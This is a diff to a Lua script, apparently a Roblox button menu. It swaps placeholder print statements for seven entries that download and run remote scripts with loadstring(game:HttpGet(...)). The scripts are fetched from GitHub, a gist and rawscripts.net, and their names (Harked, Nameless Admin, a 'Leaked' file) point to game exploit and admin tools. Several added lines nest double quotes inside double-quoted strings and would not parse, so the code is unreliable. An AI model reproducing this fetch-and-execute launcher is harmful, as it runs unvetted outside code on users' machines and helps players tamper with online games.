@@ -64,16 +64,13 @@ local function createButton(parent, text, position, script)
 end
 
 local scripts = {
-    {name = "Скрипт 1", script = "print('Скрипт 1 запущен')"},
-    {name = "Скрипт 2", script = "print('Скрипт 2 запущен')"},
-    {name = "Скрипт 3", script = "print('Скрипт 3 запущен')"},
-    {name = "Скрипт 4", script = "for i = 1, 5 do print(i) end"},
-    {name = "Скрипт 5", script = "print('Скрипт 5 запущен')"},
-    {name = "Скрипт 6", script = "print('Скрипт 6 запущен')"},
-    {name = "Скрипт 7", script = "print('Скрипт 7 запущен')"},
-    {name = "Скрипт 8", script = "print('Скрипт 8 запущен')"},
-    {name = "Скрипт 9", script = "print('Скрипт 9 запущен')"},
-    {name = "Скрипт 10", script = "print('Скрипт 10 запущен')"},
+    {name = "RTT Tool", script = "loadstring(game:HttpGet("https://raw.githubusercontent.com/sovetskii-shashlik/RTT-Tool/refs/heads/main/RTT%20Tool"))()"},
+    {name = "QuirkyCMD", script = "loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()"},
+    {name = "Krunox", script = "loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krunox-13336"))()"},
+    {name = "Cmd admin", script = "loadstring(game:HttpGet("https://raw.githubusercontent.com/lxte/cmd/main/testing-main.lua"))()"},
+    {name = "NamelessAdmin2.0", script = "loadstring(game:HttpGet('https://raw.githubusercontent.com/toyahfur/Nameless-Admin-2.0/main/unfinished-source-code'))()"},
+    {name = "Comet", script = "loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))()"},
+    {name = "Harked Reborn", script = "loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()"},
 }
 
 for i, scriptData in ipairs(scripts) do
